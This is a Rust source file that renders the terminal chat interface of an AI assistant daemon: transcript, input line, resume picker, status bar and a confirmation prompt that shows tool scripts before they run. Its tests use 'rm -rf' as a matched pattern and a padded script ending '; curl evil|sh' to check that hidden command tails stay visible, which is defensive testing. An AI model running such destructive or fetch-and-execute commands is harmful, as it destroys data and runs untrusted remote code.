//! ratatui render for the chat TUI. Mutates only layout outputs: the
//! output pane's wrap cache, the app's last viewport height, and the
//! confirmation prompt's clamped scroll.

use std::time::Instant;

use assistd_core::{PresenceState, VoiceCaptureState};
use assistd_ipc::PermissionMode;
use assistd_tools::ConfirmationRequest;
use chrono::{DateTime, Utc};
use ratatui::Frame;
use ratatui::layout::{Constraint, Layout, Position, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span, Text};
use ratatui::widgets::{Block, BorderType, Padding, Paragraph};
use ratatui_image::StatefulImage;
use textwrap::core::display_width;

use super::app::{App, BranchListEntry, ConfirmChoice, ConfirmationPrompt, ResumePicker};
use super::markdown::BLEY;
use super::output::{OutputPane, THUMBNAIL_ROWS, ThumbnailSlot, banner_lines};
use crate::client::terminal_text::escape_controls_single_line;

const INPUT_PROMPT: &str = "> ";
const SLASH_POPUP_MAX_ROWS: u16 = 6;
/// Wrapped script rows a collapsed confirmation prompt shows, its
/// "more rows" marker included.
const CONFIRM_COLLAPSED_ROWS: usize = 8;
/// Confirmation prompt rows outside its body: the two borders.
const CONFIRM_BORDER_ROWS: usize = 2;
/// Transcript rows kept above the confirmation prompt however tall it is.
const TRANSCRIPT_MIN_ROWS: usize = 3;
const SCRIPT_INDENT: &str = "  ";
/// Rows of a thumbnail slot taken by its filename caption.
const THUMBNAIL_CAPTION_ROWS: u16 = 1;
const THUMBNAIL_MAX_COLS: u16 = 32;
const RULE: &str = "─";
/// Rows each `/resume` entry takes: its title and its details.
const RESUME_ENTRY_ROWS: usize = 2;
const RESUME_DETAIL_INDENT: &str = "    ";

pub(super) fn render(frame: &mut Frame<'_>, app: &mut App) {
    let [main_area, status_area] =
        Layout::vertical([Constraint::Min(0), Constraint::Length(1)]).areas(frame.area());
    match app.shown_resume_picker() {
        Some(picker) => {
            render_resume_picker(frame, main_area, picker, &app.model_name, Utc::now());
        }
        None => render_chat(frame, main_area, app),
    }
    render_status_line(frame, status_area, app);
}

/// The transcript above the input line or the confirmation prompt, then
/// the permission-mode line.
fn render_chat(frame: &mut Frame<'_>, area: Rect, app: &mut App) {
    let [chat_area, mode_area] =
        Layout::vertical([Constraint::Min(0), Constraint::Length(1)]).areas(area);
    let output_area = match app.confirmation.as_mut() {
        Some(prompt) => render_confirmation_dock(frame, chat_area, prompt),
        None => render_input_dock(frame, chat_area, app),
    };
    app.set_output_height(output_area.height);
    render_output(frame, output_area, app);
    render_mode_line(frame, mode_area, app.permission_mode);
}

/// Draw the slash popup, the input line and its rules at the bottom of
/// `area`, returning the rows above them for the transcript.
fn render_input_dock(frame: &mut Frame<'_>, area: Rect, app: &App) -> Rect {
    let input_height = compute_input_height(area.width, area.height, app.input.buffer());
    let suggestions = app.slash_suggestions();
    let popup_height = saturating_u16(suggestions.len()).min(SLASH_POPUP_MAX_ROWS);
    let [
        output_area,
        popup_area,
        upper_rule_area,
        input_area,
        lower_rule_area,
    ] = Layout::vertical([
        Constraint::Min(3),
        Constraint::Length(popup_height),
        Constraint::Length(1),
        Constraint::Length(input_height),
        Constraint::Length(1),
    ])
    .areas(area);
    if popup_height > 0 {
        render_slash_popup(frame, popup_area, &suggestions, app.slash_selected());
    }
    render_rule(frame, upper_rule_area);
    render_input(frame, input_area, app);
    render_rule(frame, lower_rule_area);
    output_area
}

/// The `/resume` list in place of the transcript, under the transcript's
/// banner: the search box, the matching entries and a count.
fn render_resume_picker(
    frame: &mut Frame<'_>,
    area: Rect,
    picker: &ResumePicker,
    model_name: &str,
    now: DateTime<Utc>,
) {
    let banner = banner_lines(model_name, area.width);
    let [banner_area, search_area, _, list_area, count_area] = Layout::vertical([
        Constraint::Length(saturating_u16(banner.len())),
        Constraint::Length(3),
        Constraint::Length(1),
        Constraint::Min(0),
        Constraint::Length(1),
    ])
    .areas(area);
    frame.render_widget(Paragraph::new(Text::from(banner)), banner_area);
    render_resume_search(frame, search_area, picker.query());
    let matches = picker.matches();
    render_resume_list(frame, list_area, &matches, picker.selected(), now);
    let count = Span::styled(
        format!("{} of {}", matches.len(), picker.total()),
        Style::default().fg(Color::DarkGray),
    );
    frame.render_widget(Paragraph::new(count), count_area);
}

/// The search query in a rounded box, with the cursor after it.
fn render_resume_search(frame: &mut Frame<'_>, area: Rect, query: &str) {
    let query = escape_controls_single_line(query);
    let text = if query.is_empty() {
        Span::styled("Search…", Style::default().fg(Color::DarkGray))
    } else {
        Span::raw(query.as_ref())
    };
    let block = Block::bordered()
        .border_type(BorderType::Rounded)
        .border_style(rule_style())
        .padding(Padding::horizontal(1));
    let inner = block.inner(area);
    frame.render_widget(Paragraph::new(text).block(block), area);
    if inner.width == 0 || inner.height == 0 {
        return;
    }
    let cursor_x = inner
        .x
        .saturating_add(saturating_u16(display_width(&query)))
        .min(inner.right().saturating_sub(1));
    frame.set_cursor_position(Position::new(cursor_x, inner.y));
}

/// The window of `matches` that keeps `selected` in view, or a note when
/// nothing matches.
fn render_resume_list(
    frame: &mut Frame<'_>,
    area: Rect,
    matches: &[&BranchListEntry],
    selected: usize,
    now: DateTime<Utc>,
) {
    if matches.is_empty() {
        let note = Span::styled("No matches", Style::default().fg(Color::DarkGray));
        frame.render_widget(Paragraph::new(note), area);
        return;
    }
    let visible = (usize::from(area.height) / RESUME_ENTRY_ROWS).max(1);
    let start = picker_scroll_start(selected, matches.len(), visible);
    let lines: Vec<Line<'static>> = matches
        .iter()
        .enumerate()
        .skip(start)
        .take(visible)
        .flat_map(|(index, entry)| resume_entry_rows(entry, index == selected, now))
        .collect();
    frame.render_widget(Paragraph::new(Text::from(lines)), area);
}

/// First entry of a `visible`-row window that keeps `selected` in view.
fn picker_scroll_start(selected: usize, total: usize, visible: usize) -> usize {
    if total <= visible {
        return 0;
    }
    (selected + 1).saturating_sub(visible).min(total - visible)
}

/// The conversation title behind a selection pointer, then when it was last
/// active, its size and its branch.
fn resume_entry_rows(
    entry: &BranchListEntry,
    selected: bool,
    now: DateTime<Utc>,
) -> [Line<'static>; 2] {
    let title = entry
        .session_title
        .as_deref()
        .map(str::trim)
        .filter(|t| !t.is_empty())
        .map_or_else(|| "Untitled".into(), escape_controls_single_line);
    let (pointer, title_style) = if selected {
        ("❯ ", Style::default().fg(BLEY).add_modifier(Modifier::BOLD))
    } else {
        ("  ", Style::default())
    };
    let mut title_row = vec![Span::styled(format!("{pointer}{title}"), title_style)];
    if entry.is_active() {
        title_row.push(Span::styled(
            " (current)",
            Style::default().fg(Color::DarkGray),
        ));
    }
    let detail = Span::styled(
        format!("{RESUME_DETAIL_INDENT}{}", resume_entry_details(entry, now)),
        Style::default().fg(Color::Gray).add_modifier(Modifier::DIM),
    );
    [Line::from(title_row), Line::from(detail)]
}

/// `3h ago · 12 messages · fix (forked from main@4)`.
fn resume_entry_details(entry: &BranchListEntry, now: DateTime<Utc>) -> String {
    let mut details = Vec::new();
    if let Some(last_active_at) = entry.last_active_at {
        let secs = (now - last_active_at).num_seconds().max(0).unsigned_abs();
        details.push(compact_age(secs));
    }
    details.push(match entry.message_count {
        1 => "1 message".to_string(),
        count => format!("{count} messages"),
    });
    let branch = escape_controls_single_line(&entry.name);
    details.push(
        match (entry.parent_branch_name.as_deref(), entry.fork_point_seq) {
            (Some(parent), Some(seq)) => format!(
                "{branch} (forked from {}@{seq})",
                escape_controls_single_line(parent)
            ),
            _ => branch.into_owned(),
        },
    );
    details.join(" · ")
}

/// `just now`, `5m ago`, `3h ago`, `2d ago`.
fn compact_age(secs: u64) -> String {
    match secs {
        0..60 => "just now".to_string(),
        60..3600 => format!("{}m ago", secs / 60),
        3600..86_400 => format!("{}h ago", secs / 3600),
        _ => format!("{}d ago", secs / 86_400),
    }
}

fn render_slash_popup(
    frame: &mut Frame<'_>,
    area: Rect,
    suggestions: &[&'static (&'static str, &'static str)],
    selected: usize,
) {
    if area.width == 0 || area.height == 0 {
        return;
    }
    let lines: Vec<Line<'_>> = suggestions
        .iter()
        .enumerate()
        .take(area.height as usize)
        .map(|(i, (cmd, hint))| {
            let (style, hint_style) = if i == selected {
                (selected_style(), reversed_style())
            } else {
                (
                    Style::default().fg(BLEY),
                    Style::default().fg(Color::DarkGray),
                )
            };
            if hint.is_empty() {
                Line::from(Span::styled(format!(" {cmd}"), style))
            } else {
                Line::from(vec![
                    Span::styled(format!(" {cmd} "), style),
                    Span::styled((*hint).to_string(), hint_style),
                ])
            }
        })
        .collect();
    frame.render_widget(Paragraph::new(Text::from(lines)), area);
}

/// Draw the confirmation prompt at the bottom of `area` in place of the
/// input line, returning the rows above it for the transcript.
fn render_confirmation_dock(
    frame: &mut Frame<'_>,
    area: Rect,
    prompt: &mut ConfirmationPrompt,
) -> Rect {
    let width = usize::from(area.width.saturating_sub(2));
    let max_body_rows =
        usize::from(area.height).saturating_sub(TRANSCRIPT_MIN_ROWS + CONFIRM_BORDER_ROWS);
    let body = confirmation_body(prompt, width, max_body_rows);
    let height = saturating_u16(body.len() + CONFIRM_BORDER_ROWS).min(area.height);
    let [output_area, prompt_area] =
        Layout::vertical([Constraint::Min(0), Constraint::Length(height)]).areas(area);
    let accent = Style::default().fg(Color::Yellow);
    let title = format!(
        " Confirm {} ",
        escape_controls_single_line(&prompt.request.tool)
    );
    let block = Block::bordered()
        .border_type(BorderType::Rounded)
        .border_style(accent)
        .title(Span::styled(title, accent.add_modifier(Modifier::BOLD)));
    frame.render_widget(Paragraph::new(Text::from(body)).block(block), prompt_area);
    output_area
}

/// The reason, the script, and the numbered choices, in at most
/// `max_rows` rows unless even one script row would not fit.
fn confirmation_body(
    prompt: &mut ConfirmationPrompt,
    width: usize,
    max_rows: usize,
) -> Vec<Line<'static>> {
    let reason_style = Style::default().add_modifier(Modifier::BOLD);
    let mut body = indented_rows("", &prompt.request.matched_pattern, reason_style, width);
    body.push(Line::default());
    let choices = choice_rows(prompt, width);
    let rows_around_script = body.len() + 2 + choices.len();
    let script_budget = max_rows.saturating_sub(rows_around_script).max(1);
    body.extend(script_rows(prompt, width, script_budget));
    body.push(Line::default());
    body.push(Line::from("Do you want to proceed?"));
    body.extend(choices);
    body
}

/// The script in at most `budget` rows: the first few behind a marker
/// while collapsed, or a window at the prompt's scroll while expanded.
/// Clamps the scroll to the last full window.
fn script_rows(prompt: &mut ConfirmationPrompt, width: usize, budget: usize) -> Vec<Line<'static>> {
    let rows = wrapped_script(
        &prompt.request.script,
        width.saturating_sub(SCRIPT_INDENT.len()),
    );
    let shown = if prompt.expanded {
        budget
    } else {
        budget.min(CONFIRM_COLLAPSED_ROWS)
    };
    if rows.len() <= shown {
        prompt.scroll = 0;
        return rows.into_iter().map(script_line).collect();
    }
    let window = shown.saturating_sub(1);
    let hidden = rows.len() - window;
    let first = if prompt.expanded {
        prompt.scroll.min(hidden)
    } else {
        0
    };
    prompt.scroll = first;
    let marker = if prompt.expanded {
        format!(
            "rows {}–{} of {} · PgUp/PgDn to scroll · Tab to collapse",
            first + 1,
            first + window,
            rows.len()
        )
    } else {
        format!("… +{hidden} more rows (Tab to expand)")
    };
    let mut lines: Vec<Line<'static>> = rows
        .into_iter()
        .skip(first)
        .take(window)
        .map(script_line)
        .collect();
    lines.push(Line::from(Span::styled(
        format!("{SCRIPT_INDENT}{marker}"),
        Style::default().fg(Color::Yellow),
    )));
    lines
}

/// Each script line hard-wrapped to `width`, with control and invisible
/// formatting characters escaped so the rows show exactly what will run.
fn wrapped_script(script: &str, width: usize) -> Vec<String> {
    script
        .split('\n')
        .flat_map(|line| hard_wrap(&escape_controls_single_line(line), width))
        .collect()
}

fn script_line(row: String) -> Line<'static> {
    Line::from(vec![Span::raw(SCRIPT_INDENT), Span::raw(row)])
}

/// One numbered row per choice, the selected one marked and highlighted.
fn choice_rows(prompt: &ConfirmationPrompt, width: usize) -> Vec<Line<'static>> {
    prompt
        .choices()
        .iter()
        .enumerate()
        .flat_map(|(index, choice)| {
            let label = match choice {
                ConfirmChoice::Once => "Yes".to_string(),
                ConfirmChoice::Always => always_label(&prompt.request),
                ConfirmChoice::Deny => "No (Esc)".to_string(),
            };
            let (pointer, style) = if index == prompt.selected {
                ("❯", Style::default().fg(BLEY).add_modifier(Modifier::BOLD))
            } else {
                (" ", Style::default())
            };
            let lead = format!("{pointer} {}. ", index + 1);
            indented_rows(&lead, &label, style, width)
        })
        .collect()
}

/// What the "always" choice stops asking about, in the terms of the tool
/// that asked.
fn always_label(request: &ConfirmationRequest) -> String {
    let names = request
        .always_allow
        .iter()
        .map(|name| escape_controls_single_line(name))
        .collect::<Vec<_>>()
        .join(", ");
    match request.tool.as_str() {
        "web" => format!("Yes, allow all fetches from {names}"),
        tool if tool.starts_with("mcp__") => format!("Yes, always allow {names}"),
        _ => format!("Yes, allow all {names} commands"),
    }
}

/// `lead` followed by `text` hard-wrapped to `width` columns, continuation
/// rows indented under the text, everything in `style`.
fn indented_rows(lead: &str, text: &str, style: Style, width: usize) -> Vec<Line<'static>> {
    let indent = display_width(lead);
    let text_width = width.saturating_sub(indent).max(1);
    hard_wrap(&escape_controls_single_line(text), text_width)
        .into_iter()
        .enumerate()
        .map(|(row, chunk)| {
            let lead = if row == 0 {
                lead.to_string()
            } else {
                " ".repeat(indent)
            };
            Line::from(Span::styled(format!("{lead}{chunk}"), style))
        })
        .collect()
}

/// Split `text` into rows of at most `width` display columns, breaking
/// anywhere so whitespace is kept verbatim. Always yields at least one row.
fn hard_wrap(text: &str, width: usize) -> Vec<String> {
    let width = width.max(1);
    let mut rows = Vec::new();
    let mut row = String::new();
    let mut row_width = 0;
    for c in text.chars() {
        let char_width = display_width(c.encode_utf8(&mut [0; 4]));
        if row_width + char_width > width && row_width > 0 {
            rows.push(std::mem::take(&mut row));
            row_width = 0;
        }
        row.push(c);
        row_width += char_width;
    }
    rows.push(row);
    rows
}

/// The transcript, with a blank row and the generating row below it while
/// a reply is open.
fn render_output(frame: &mut Frame<'_>, area: Rect, app: &mut App) {
    if area.width == 0 || area.height == 0 {
        return;
    }
    let Some(started_at) = app.reply_started_at else {
        render_transcript(frame, area, &mut app.output);
        return;
    };
    let [transcript_area, _, status_row] = Layout::vertical([
        Constraint::Min(0),
        Constraint::Length(1),
        Constraint::Length(1),
    ])
    .areas(area);
    render_generating_row(frame, status_row, app, started_at);
    render_transcript(frame, transcript_area, &mut app.output);
}

fn render_transcript(frame: &mut Frame<'_>, area: Rect, output: &mut OutputPane) {
    let slots = output.thumbnail_layout(area.width);
    let (lines, viewport_top) = output.render_view(area.width, area.height);
    for (line, row) in lines.iter().zip(area.rows()) {
        frame.render_widget(line, row);
    }
    render_thumbnails(frame, area, output, &slots, viewport_top);
}

/// Draw each thumbnail whose image rows sit wholly inside the viewport
/// starting at wrapped row `viewport_top`.
fn render_thumbnails(
    frame: &mut Frame<'_>,
    area: Rect,
    output: &mut OutputPane,
    slots: &[ThumbnailSlot],
    viewport_top: usize,
) {
    let image_height = THUMBNAIL_ROWS.saturating_sub(THUMBNAIL_CAPTION_ROWS);
    let viewport_bottom = viewport_top.saturating_add(area.height as usize);
    for slot in slots {
        let image_start = slot.start_row + THUMBNAIL_CAPTION_ROWS as usize;
        let image_end = slot.start_row + slot.height;
        if image_start < viewport_top || image_end > viewport_bottom {
            continue;
        }
        let local_row = saturating_u16(image_start - viewport_top);
        if local_row >= area.height {
            continue;
        }
        let rect = Rect {
            x: area.x,
            y: area.y + local_row,
            width: area.width.min(THUMBNAIL_MAX_COLS),
            height: image_height.min(area.height - local_row),
        };
        if let Some(state) = output.thumbnail_protocol_mut(slot.item_idx) {
            frame.render_stateful_widget(StatefulImage::default(), rect, state);
        }
    }
}

/// Spinner row for an open reply with its elapsed time, the turn's tokens,
/// the conversation's current size and its total including compacted
/// history, plus a warning when the daemon is about to compact history.
fn render_generating_row(frame: &mut Frame<'_>, row: Rect, app: &App, started_at: Instant) {
    let elapsed = compact_duration(started_at.elapsed().as_secs());
    let sizes = app.tokens.context_tokens().zip(app.tokens.total_tokens());
    let progress = match (app.tokens.tokens(), sizes) {
        (0, _) => elapsed,
        (tokens, None) => format!("{elapsed} · {} tokens", compact_count(tokens)),
        (tokens, Some((context, total))) => format!(
            "{elapsed} · {} turn · {} context · {} total",
            compact_count(tokens),
            compact_count(context),
            compact_count(total)
        ),
    };
    let mut spans = vec![Span::styled(
        format!("{} Generating… ({progress})", app.spinner_char()),
        Style::default()
            .fg(Color::Gray)
            .add_modifier(Modifier::DIM)
            .add_modifier(Modifier::ITALIC),
    )];
    if app.compacting_soon {
        spans.push(Span::styled(
            " · compacting soon",
            Style::default().fg(BLEY).add_modifier(Modifier::ITALIC),
        ));
    }
    frame.render_widget(Paragraph::new(Line::from(spans)), row);
}

/// `Worked for 1m 5s (1.2k tokens)`, closing a finished reply.
pub(super) fn turn_summary(elapsed_secs: u64, tokens: u64) -> String {
    let elapsed = compact_duration(elapsed_secs);
    match tokens {
        0 => format!("Worked for {elapsed}"),
        tokens => format!("Worked for {elapsed} ({} tokens)", compact_count(tokens)),
    }
}

/// `42s`, `3m 5s`, `1hr 3m 3s`: leading zero units are dropped.
pub(super) fn compact_duration(total_secs: u64) -> String {
    let (hours, mins, secs) = (total_secs / 3600, total_secs / 60 % 60, total_secs % 60);
    match (hours, mins) {
        (0, 0) => format!("{secs}s"),
        (0, _) => format!("{mins}m {secs}s"),
        _ => format!("{hours}hr {mins}m {secs}s"),
    }
}

/// `950`, `1.2k`, `34.5k`: one decimal place from a thousand up.
fn compact_count(count: u64) -> String {
    if count < 1000 {
        count.to_string()
    } else {
        format!("{:.1}k", count as f64 / 1000.0)
    }
}

fn render_rule(frame: &mut Frame<'_>, area: Rect) {
    let rule = RULE.repeat(usize::from(area.width));
    frame.render_widget(Paragraph::new(Span::styled(rule, rule_style())), area);
}

fn render_mode_line(frame: &mut Frame<'_>, area: Rect, mode: PermissionMode) {
    let label = match mode {
        PermissionMode::Manual => "manual mode on",
        PermissionMode::AcceptCommands => "accept commands on",
    };
    let line = Span::styled(format!("{label} (shift+tab)"), Style::default().fg(BLEY));
    frame.render_widget(Paragraph::new(line), area);
}

/// Voice capture, a model that is not active, staged attachments and then a notice, the scroll
/// position or the interrupt hint, all gray and left-aligned.
fn render_status_line(frame: &mut Frame<'_>, area: Rect, app: &App) {
    let text_style = Style::default().fg(Color::Gray).add_modifier(Modifier::DIM);
    let mut spans = Vec::new();
    for text in status_segments(app).into_iter().chain(status_hint(app)) {
        if !spans.is_empty() {
            spans.push(Span::styled(" · ", rule_style()));
        }
        spans.push(Span::styled(text, text_style));
    }
    frame.render_widget(Paragraph::new(Line::from(spans)), area);
}

fn status_segments(app: &App) -> Vec<String> {
    let mut segments = Vec::new();
    if let Some(label) = voice_indicator(app.listening) {
        segments.push(format!("{} {label}", app.spinner_char()));
    }
    if let Some(state) = app.presence_state.filter(|s| *s != PresenceState::Active) {
        segments.push(format!("model is {}", state.as_str()));
    }
    match app.pending_attachments.len() {
        0 => {}
        1 => segments.push("1 attachment".into()),
        count => segments.push(format!("{count} attachments")),
    }
    segments
}

fn status_hint(app: &App) -> Option<String> {
    if app.confirmation.is_some() {
        Some("↑/↓ select · Enter confirm · Esc deny".to_string())
    } else if app.resume_picker.is_some() {
        Some("type to search · ↑/↓ select · Enter resume · Esc cancel".to_string())
    } else if let Some(notice) = app.notice() {
        Some(notice.to_string())
    } else if app.output.scroll_offset() > 0 {
        Some(format!("↑{} · PgDn to follow", app.output.scroll_offset()))
    } else if app.generating() {
        Some("Esc to interrupt".to_string())
    } else {
        None
    }
}

fn rule_style() -> Style {
    Style::default().fg(Color::DarkGray)
}

fn reversed_style() -> Style {
    Style::default().add_modifier(Modifier::REVERSED)
}

fn selected_style() -> Style {
    Style::default()
        .add_modifier(Modifier::REVERSED)
        .add_modifier(Modifier::BOLD)
}

fn voice_indicator(s: VoiceCaptureState) -> Option<&'static str> {
    match s {
        VoiceCaptureState::Idle => None,
        VoiceCaptureState::Recording => Some("Listening…"),
        VoiceCaptureState::Queued => Some("Processing…"),
        VoiceCaptureState::Transcribing => Some("transcribing…"),
    }
}

fn render_input(frame: &mut Frame<'_>, area: Rect, app: &App) {
    if area.width == 0 || area.height == 0 {
        return;
    }
    let prompt_w = saturating_u16(INPUT_PROMPT.chars().count());
    let buf_chars: Vec<char> = app.input.buffer().chars().collect();
    let rows = wrap_input(&buf_chars, prompt_w, area.width);

    let lines: Vec<Line<'_>> = rows
        .iter()
        .enumerate()
        .map(|(i, &(start, end))| {
            let mut row = String::new();
            if i == 0 {
                row.push_str(INPUT_PROMPT);
            }
            row.extend(&buf_chars[start..end]);
            Line::from(row)
        })
        .collect();
    frame.render_widget(Paragraph::new(Text::from(lines)), area);

    let (row_idx, col) = locate_cursor(&rows, app.input.cursor_col() as usize);
    let mut cursor_x = saturating_u16(col);
    if row_idx == 0 {
        cursor_x = cursor_x.saturating_add(prompt_w);
    }
    let cy = area
        .y
        .saturating_add(saturating_u16(row_idx))
        .min(area.y + area.height.saturating_sub(1));
    let cx = (area.x + cursor_x).min(area.x + area.width.saturating_sub(1));
    frame.set_cursor_position(Position::new(cx, cy));
}

/// Rows the input line needs in a dock `dock_height` rows tall, leaving
/// room for the transcript's minimum and the two rules.
fn compute_input_height(frame_width: u16, dock_height: u16, buffer: &str) -> u16 {
    if frame_width == 0 {
        return 1;
    }
    let prompt_w = saturating_u16(INPUT_PROMPT.chars().count());
    let chars: Vec<char> = buffer.chars().collect();
    let needed = saturating_u16(wrap_input(&chars, prompt_w, frame_width).len());
    let cap = dock_height.saturating_sub(5).max(1);
    needed.clamp(1, cap)
}

/// `(start, end)` char ranges of each input row, breaking after the last
/// whitespace that fits. A row that fills the width is followed by an
/// empty one for the cursor.
fn wrap_input(buf: &[char], prompt_w: u16, width: u16) -> Vec<(usize, usize)> {
    let n = buf.len();
    if width == 0 {
        return vec![(0, n)];
    }
    let mut rows: Vec<(usize, usize)> = Vec::new();
    let mut start = 0usize;
    while start < n {
        let cap = if rows.is_empty() {
            (width as usize).saturating_sub(prompt_w as usize).max(1)
        } else {
            width as usize
        };
        if n - start <= cap {
            rows.push((start, n));
            break;
        }
        let end_max = start + cap;
        let row_end = buf[start..end_max]
            .iter()
            .rposition(|c| c.is_whitespace())
            .map_or(end_max, |i| start + i + 1);
        rows.push((start, row_end));
        start = row_end;
    }
    if rows.is_empty() {
        rows.push((0, 0));
    }
    let (ls, le) = *rows.last().expect("rows non-empty");
    let last_visible = (le - ls)
        + if rows.len() == 1 {
            prompt_w as usize
        } else {
            0
        };
    if last_visible >= width as usize {
        rows.push((n, n));
    }
    rows
}

fn locate_cursor(rows: &[(usize, usize)], cursor: usize) -> (usize, usize) {
    for (idx, &(s, e)) in rows.iter().enumerate() {
        if cursor < e {
            return (idx, cursor - s);
        }
        if cursor == e {
            if idx + 1 < rows.len() {
                return (idx + 1, 0);
            }
            return (idx, cursor - s);
        }
    }
    let last = rows.len().saturating_sub(1);
    let (s, e) = rows.get(last).copied().unwrap_or((0, 0));
    (last, cursor.saturating_sub(s).min(e - s))
}

fn saturating_u16(value: usize) -> u16 {
    u16::try_from(value).unwrap_or(u16::MAX)
}

#[cfg(test)]
mod tests {
    use assistd_tools::Risk;
    use ratatui::Terminal;
    use ratatui::backend::TestBackend;

    use super::*;

    fn confirmation_prompt(script: &str) -> ConfirmationPrompt {
        ConfirmationPrompt::new(
            "c1".into(),
            ConfirmationRequest {
                tool: "bash".into(),
                script: script.into(),
                matched_pattern: "rm -rf".into(),
                always_allow: Vec::new(),
                risk: Risk::Elevated,
            },
        )
    }

    fn prompt_screen(prompt: &mut ConfirmationPrompt, width: u16, height: u16) -> String {
        let mut terminal = Terminal::new(TestBackend::new(width, height)).expect("test terminal");
        terminal
            .draw(|frame| {
                render_confirmation_dock(frame, frame.area(), prompt);
            })
            .expect("draw");
        let buffer = terminal.backend().buffer();
        (0..height)
            .map(|y| {
                (0..width)
                    .map(|x| buffer[(x, y)].symbol())
                    .collect::<String>()
            })
            .collect::<Vec<_>>()
            .join("\n")
    }

    fn numbered_script(lines: usize) -> String {
        (0..lines)
            .map(|i| format!("cmd{i}"))
            .collect::<Vec<_>>()
            .join("\n")
    }

    #[test]
    fn script_rows_wrap_long_lines_keeping_whitespace() {
        let script = format!("ls ~/docs{}; curl evil|sh", " ".repeat(20));
        let rows = wrapped_script(&script, 16);
        assert_eq!(rows.concat(), script);
        assert!(rows.iter().all(|row| display_width(row) <= 16));
    }

    #[test]
    fn hard_wrap_breaks_before_a_wide_char_that_would_overflow() {
        assert_eq!(hard_wrap("ab漢", 3), vec!["ab", "漢"]);
        assert_eq!(hard_wrap("", 3), vec![""]);
    }

    #[test]
    fn confirmation_prompt_shows_the_tail_of_a_padded_command() {
        let script = format!("ls ~/docs{}; curl evil|sh", " ".repeat(120));
        let screen = prompt_screen(&mut confirmation_prompt(&script), 160, 40);
        assert!(screen.contains("; curl evil|sh"), "{screen}");
    }

    #[test]
    fn collapsed_prompt_counts_the_rows_it_hides() {
        let mut prompt = confirmation_prompt(&numbered_script(20));
        let screen = prompt_screen(&mut prompt, 100, 40);
        assert!(screen.contains("cmd6"), "{screen}");
        assert!(!screen.contains("cmd7"), "{screen}");
        assert!(
            screen.contains("… +13 more rows (Tab to expand)"),
            "{screen}"
        );
    }

    #[test]
    fn expanded_prompt_scrolls_to_the_last_row_and_no_further() {
        let mut prompt = confirmation_prompt(&numbered_script(40));
        prompt.expanded = true;
        prompt.scroll = usize::MAX;
        let screen = prompt_screen(&mut prompt, 100, 30);
        assert!(screen.contains("cmd39"), "{screen}");
        assert!(screen.contains("of 40 · PgUp/PgDn to scroll"), "{screen}");
        let clamped = prompt.scroll;
        prompt_screen(&mut prompt, 100, 30);
        assert_eq!(prompt.scroll, clamped);
    }

    #[test]
    fn input_height_grows_when_buffer_overflows_width() {
        assert_eq!(compute_input_height(10, 24, ""), 1);
        assert_eq!(compute_input_height(10, 24, &"a".repeat(7)), 1);
        assert_eq!(
            compute_input_height(10, 24, &"a".repeat(8)),
            2,
            "a full first row wraps the cursor onto a second"
        );
        assert_eq!(compute_input_height(10, 24, &"a".repeat(18)), 3);
    }

    fn chars(s: &str) -> Vec<char> {
        s.chars().collect()
    }

    #[test]
    fn wrap_input_hard_breaks_when_word_is_longer_than_row() {
        let rows = wrap_input(&chars("hellotherefriend"), 2, 10);
        assert_eq!(rows, vec![(0, 8), (8, 16)]);
    }

    #[test]
    fn locate_cursor_jumps_to_next_row_on_boundary() {
        let buf = chars("hello world");
        let rows = wrap_input(&buf, 2, 10);
        assert_eq!(rows, [(0, 6), (6, 11)]);
        assert_eq!(locate_cursor(&rows, 0), (0, 0));
        assert_eq!(locate_cursor(&rows, 5), (0, 5));
        assert_eq!(locate_cursor(&rows, 6), (1, 0));
        assert_eq!(locate_cursor(&rows, 11), (1, 5));
    }

    #[test]
    fn locate_cursor_lands_on_phantom_row_after_full_row() {
        let buf = chars("aaaaaaaa");
        let rows = wrap_input(&buf, 2, 10);
        assert_eq!(locate_cursor(&rows, 8), (1, 0));
    }
}
